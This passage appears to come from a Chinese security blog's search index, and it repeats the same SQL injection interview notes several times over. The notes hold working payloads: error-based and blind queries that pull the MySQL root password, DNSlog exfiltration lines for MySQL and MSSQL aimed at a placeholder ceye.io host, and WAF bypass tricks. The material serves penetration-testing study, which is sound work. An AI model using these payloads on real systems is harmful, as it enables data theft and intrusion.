user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#4一个登录框怎么测试"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#5报错注入的函数有哪些"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#6sql-注入无回显的情况下利用-dnslogmysql-下利用什么构造代码mssql-下又如何构造"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#7sql注入时-and-or-被过滤怎办"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 